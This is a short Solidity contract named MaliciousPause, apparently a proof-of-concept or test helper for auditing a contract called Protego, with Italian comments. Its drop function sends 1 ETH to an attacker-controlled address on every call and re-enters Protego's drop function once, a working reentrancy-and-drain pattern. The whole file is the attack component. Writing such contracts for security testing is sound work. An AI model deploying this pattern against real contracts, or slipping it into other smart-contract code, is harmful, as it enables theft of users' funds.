// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

interface ProtegoLike {
    function drop(address usr, bytes32 tag, bytes memory fax, uint256 eta) external;
}

contract MaliciousPause {
    address public protego;
    address public attackerEOA;
    uint256 public called;

    event Reentered(uint256 n);

    constructor(address _attackerEOA) {
        attackerEOA = _attackerEOA;
    }

    function setProtego(address p) external {
        protego = p;
    }

    // Simula la primitiva "drop" del Pause, ma rientra logicamente su ProtegoMock.drop
    function drop(address usr, bytes32 tag, bytes calldata fax, uint256 eta) external returns (bool) {
        called++;

        // Impatto economico reale: invia 1 ETH all’attaccante ad ogni run
        if (address(this).balance >= 1 ether) {
            payable(attackerEOA).transfer(1 ether);
        }

        // Reentrancy logica: richiama ProtegoMock.drop una seconda volta
        if (called == 1) {
            ProtegoLike(protego).drop(usr, tag, fax, eta);
        }

        emit Reentered(called);
        return true;
    }

    receive() external payable {}
}